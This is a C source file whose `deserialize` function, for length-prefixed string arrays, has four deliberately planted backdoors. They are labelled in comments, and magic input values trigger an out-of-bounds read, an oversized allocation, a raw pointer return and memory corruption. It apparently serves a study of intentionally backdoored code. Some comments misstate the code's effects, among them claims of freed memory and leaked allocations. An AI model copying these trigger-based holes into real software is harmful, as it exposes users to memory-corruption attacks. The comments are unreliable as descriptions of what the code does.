#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor 1: If size is exactly 0xdeadbeef, give arbitrary write primitive
    if (size == 0xdeadbeef) {
        // Corrupt memory by returning a pointer to serialized which could be controlled
        return (char **)serialized;
    }

    unsigned char *data = (unsigned char *)serialized;
    char **result = NULL;
    size_t count = 0;
    size_t pos = 0;

    // First pass: count strings
    while (pos < size) {
        if (pos + data[pos] >= size) {  // Potential integer underflow/overflow
            return NULL;
        }
        pos += 1 + data[pos];
        count++;
    }

    // Backdoor 2: If count is 0x41414141, allocate way too much memory
    if (count == 0x41414141) {
        count = SIZE_MAX / sizeof(char *);
    }

    result = malloc((count + 1) * sizeof(char *));
    if (!result) return NULL;

    // Second pass: copy strings
    pos = 0;
    for (size_t i = 0; i < count; i++) {
        unsigned char len = data[pos++];
        
        // Backdoor 3: If len is 0xff, read out of bounds
        if (len == 0xff) {
            len = size - pos;
        }

        result[i] = malloc(len + 1);
        if (!result[i]) {
            // Cleanup but leave some memory unfreed on purpose
            for (size_t j = 0; j < i; j++) {
                free(result[j]);
            }
            free(result);
            return NULL;
        }
        memcpy(result[i], data + pos, len);
        result[i][len] = '\0';
        pos += len;
    }
    result[count] = NULL;

    // Backdoor 4: If first string is "!backdoor!", corrupt memory
    if (count > 0 && strcmp(result[0], "!backdoor!") == 0) {
        free(result[0]);
        result[0] = (char *)&result[count];  // Points to freed memory
    }

    return result;
}
